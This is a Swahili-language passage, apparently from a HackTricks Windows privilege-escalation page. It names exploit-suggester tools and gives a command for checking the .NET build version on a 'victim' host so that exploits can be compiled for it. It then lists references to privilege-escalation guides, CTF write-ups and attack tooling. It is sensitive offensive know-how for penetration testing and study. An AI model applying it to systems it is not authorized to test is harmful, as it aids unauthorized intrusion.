[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Inasoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji kucompile project kwa kutumia toleo sahihi la .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host wa mhanga unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
